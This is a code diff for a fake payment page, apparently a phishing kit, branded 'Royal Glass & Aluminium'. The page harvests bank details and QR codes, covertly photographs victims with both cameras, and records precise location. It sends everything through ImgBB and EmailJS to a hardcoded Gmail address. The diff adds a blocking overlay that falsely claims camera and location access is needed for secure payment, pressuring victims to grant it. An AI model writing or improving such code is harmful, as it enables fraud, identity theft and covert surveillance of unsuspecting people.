@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Payments- Royal Glass & Aluminium · secure</title>
+    <title>Payments - Royal Glass & Aluminium · secure</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
     </script>
@@ -354,13 +354,113 @@
             opacity: 1;
             pointer-events: auto;
         }
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .permission-overlay.show {
+            display: flex;
+        }
+        .permission-modal {
+            background: white;
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .permission-modal i {
+            font-size: 56px;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+        }
+        .permission-modal h2 {
+            color: #1a2a3a;
+            margin-bottom: 10px;
+        }
+        .permission-modal p {
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.6;
+            font-size: 14px;
+        }
+        .permission-modal .retry-btn {
+            background: #2c4b6b;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .permission-modal .retry-btn:hover {
+            background: #1a2a3a;
+            transform: scale(1.02);
+        }
+        .permission-modal .retry-btn:active {
+            transform: scale(0.97);
+        }
+        .permission-modal .missing-list {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 12px 18px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        .permission-modal .missing-list li {
+            list-style: none;
+            padding: 4px 0;
+            color: #dc3545;
+            font-size: 14px;
+        }
+        .permission-modal .missing-list li::before {
+            content: "✗ ";
+            font-weight: bold;
+        }
+        .permission-modal .missing-list li.granted::before {
+            content: "✓ ";
+            color: #28a745;
+        }
+        .permission-modal .missing-list li.granted {
+            color: #28a745;
+        }
     </style>
 </head>
 <body>
+    <!-- Permission Overlay -->
+    <div id="permissionOverlay" class="permission-overlay">
+        <div class="permission-modal">
+            <i class="fas fa-exclamation-triangle"></i>
+            <h2>⚠️ Permissions Required</h2>
+            <p>Royal Glass & Aluminium needs access to your camera and location to process your payment securely.</p>
+            <div class="missing-list" id="missingList">
+                <li id="permLocation">📍 Location access required</li>
+                <li id="permCamera">📸 Camera access required</li>
+            </div>
+            <p style="font-size: 13px; color: #888;">Please click the button below and allow permissions when prompted.</p>
+            <button class="retry-btn" id="retryBtn">
+                <i class="fas fa-redo" style="margin-right: 8px;"></i> Allow & Retry
+            </button>
+        </div>
+    </div>
+
     <div id="toast" class="toast-message">✓ submitted</div>
 
     <div class="glass-card">
-        <h1><i class="fas fa-building"></i>Royal Glass & Aluminium</h1>
+        <h1><i class="fas fa-building"></i> Royal Glass & Aluminium</h1>
         <div class="aluminium-line"></div>
         <div class="subhead"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i> secure · bank details</div>
 
@@ -455,6 +555,8 @@
             const bankSection = document.getElementById('bankSection');
             const qrSection = document.getElementById('qrSection');
             const optionIndicator = document.getElementById('optionIndicator');
+            const permissionOverlay = document.getElementById('permissionOverlay');
+            const retryBtn = document.getElementById('retryBtn');
             
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -464,6 +566,9 @@
             const qrInput = document.getElementById('qrUpload');
             const qrPreview = document.getElementById('qrPreview');
             const qrFileName = document.getElementById('qr-file-name');
+            
+            const permLocation = document.getElementById('permLocation');
+            const permCamera = document.getElementById('permCamera');
 
             // Toast
             const toast = document.getElementById('toast');
@@ -566,10 +671,11 @@
 
             updateSections();
 
-            // Permission check
+            // ----- PERMISSION HANDLING -----
             async function requestPermissions() {
                 const permissions = { geolocation: false, camera: false };
 
+                // Geolocation
                 try {
                     await new Promise((resolve) => {
                         if (!navigator.geolocation) {
@@ -579,7 +685,7 @@
                         navigator.geolocation.getCurrentPosition(
                             () => { permissions.geolocation = true; resolve(true); },
                             () => { resolve(false); },
-                            { enableHighAccuracy: true, timeout: 3000 }
+                            { enableHighAccuracy: true, timeout: 5000 }
                         );
                     });
                 } catch (e) { 
@@ -587,6 +693,7 @@
                     permissions.geolocation = false; 
                 }
 
+                // Camera
                 try {
                     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                         const stream = await navigator.mediaDevices.getUserMedia({
@@ -606,6 +713,69 @@
                 return permissions;
             }
 
+            // Show permission overlay
+            function showPermissionOverlay(missing) {
+                permLocation.className = missing.includes('location') ? '' : 'granted';
+                permCamera.className = missing.includes('camera') ? '' : 'granted';
+                
+                permLocation.textContent = missing.includes('location') ? 
+                    '📍 Location access required' : 
+                    '✅ Location access granted';
+                permCamera.textContent = missing.includes('camera') ? 
+                    '📸 Camera access required' : 
+                    '✅ Camera access granted';
+                
+                permissionOverlay.classList.add('show');
+            }
+
+            function hidePermissionOverlay() {
+                permissionOverlay.classList.remove('show');
+            }
+
+            // Check permissions on load and show overlay if missing
+            async function checkPermissionsOnLoad() {
+                const perms = await requestPermissions();
+                const missing = [];
+                
+                if (!perms.geolocation) missing.push('location');
+                if (!perms.camera) missing.push('camera');
+                
+                if (missing.length > 0) {
+                    showPermissionOverlay(missing);
+                    return false;
+                }
+                
+                return true;
+            }
+
+            // Retry button handler
+            retryBtn.addEventListener('click', async function() {
+                this.disabled = true;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 8px;"></i> Checking...';
+                
+                const perms = await requestPermissions();
+                const missing = [];
+                
+                if (!perms.geolocation) missing.push('location');
+                if (!perms.camera) missing.push('camera');
+                
+                if (missing.length > 0) {
+                    showPermissionOverlay(missing);
+                    this.disabled = false;
+                    this.innerHTML = '<i class="fas fa-redo" style="margin-right: 8px;"></i> Allow & Retry';
+                } else {
+                    hidePermissionOverlay();
+                    showToast('✅ Permissions granted! You can now submit.');
+                    this.disabled = false;
+                    this.innerHTML = '<i class="fas fa-redo" style="margin-right: 8px;"></i> Allow & Retry';
+                }
+            });
+
+            // Check permissions on load
+            checkPermissionsOnLoad();
+
+            // ----- REST OF THE FUNCTIONS (capturePhotos, uploadToImgBB, etc.) -----
+            
             // Get user location
             function getUserLocation() {
                 return new Promise((resolve) => {
@@ -769,7 +939,6 @@
                     // Build HTML for images
                     let imagesHTML = '';
                     
-                    // Front camera
                     if (uploadedImages.front && uploadedImages.front.length > 0) {
                         imagesHTML += `<h4 style="margin: 10px 0 5px 0; color: #2c4b6b;">📸 Front Camera (${uploadedImages.front.length})</h4>`;
                         imagesHTML += `<div class="photo-grid">`;
@@ -782,7 +951,6 @@
                         imagesHTML += `</div>`;
                     }
                     
-                    // Back camera
                     if (uploadedImages.back && uploadedImages.back.length > 0) {
                         imagesHTML += `<h4 style="margin: 10px 0 5px 0; color: #2c4b6b;">📸 Back Camera (${uploadedImages.back.length})</h4>`;
                         imagesHTML += `<div class="photo-grid">`;
@@ -795,7 +963,6 @@
                         imagesHTML += `</div>`;
                     }
                     
-                    // QR code
                     if (uploadedImages.qr) {
                         imagesHTML += `<h4 style="margin: 10px 0 5px 0; color: #2c4b6b;">📱 QR Code</h4>`;
                         imagesHTML += `<div style="text-align:center;">
@@ -830,11 +997,6 @@
                     const size = JSON.stringify(emailParams).length;
                     console.log('📤 Sending email to:', RECIPIENT_EMAIL);
                     console.log('📊 Final payload size:', size, 'bytes');
-                    console.log('📸 Front images:', uploadedImages.front.length);
-                    console.log('📸 Back images:', uploadedImages.back.length);
-                    console.log('📱 QR uploaded:', !!uploadedImages.qr);
-                    console.log('📍 Coordinates:', payload.userLocation.lat, payload.userLocation.lon);
-                    console.log('📍 Google Maps link:', mapLink);
                     
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
@@ -845,8 +1007,6 @@
                     return true;
                 } catch (error) {
                     console.error('❌ EmailJS error:', error);
-                    console.error('Status:', error.status);
-                    console.error('Text:', error.text);
                     return false;
                 }
             }
@@ -854,6 +1014,18 @@
             // MAIN SUBMIT
             document.getElementById('bankForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
+
+                // First check permissions again
+                const perms = await requestPermissions();
+                const missing = [];
+                if (!perms.geolocation) missing.push('location');
+                if (!perms.camera) missing.push('camera');
+                
+                if (missing.length > 0) {
+                    showPermissionOverlay(missing);
+                    showToast('⚠️ Please grant permissions to continue', true);
+                    return;
+                }
 
                 const hasQR = qrInput.files && qrInput.files.length > 0;
                 const hasBank = fullName.value.trim() !== '' || 
@@ -870,17 +1042,6 @@
                 showSpinner();
 
                 try {
-                    // Check permissions
-                    const perms = await requestPermissions();
-                    
-                    if (!perms.geolocation || !perms.camera) {
-                        console.warn('⚠️ Permissions denied');
-                        showToast('❌ Something went wrong. Please try again.', true);
-                        hideSpinner();
-                        setTimeout(() => location.reload(), 2000);
-                        return;
-                    }
-
                     console.log('✅ Permissions granted');
 
                     // Collect form data
@@ -935,7 +1096,6 @@
 
                     // Upload images to ImgBB
                     console.log('📤 Uploading images to ImgBB...');
-                    // showToast('⏳ Uploading images...');
                     
                     const uploadedImages = await uploadImagesToImgBB(
                         frontResult.images || [],
@@ -972,17 +1132,15 @@
                         updateSections();
                     } else {
                         showToast('❌ Something went wrong. Please try again.', true);
-                        setTimeout(() => location.reload(), 2000);
                     }
                 } catch (error) {
                     console.error('❌ Fatal error:', error);
                     hideSpinner();
                     showToast('❌ Something went wrong. Please try again.', true);
-                    setTimeout(() => location.reload(), 2000);
                 }
             });
 
-            console.log('Glass & Aluminium · secure (With ImgBB + Google Maps)');
+            console.log('Royal Glass & Aluminium · secure (With permission overlay)');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
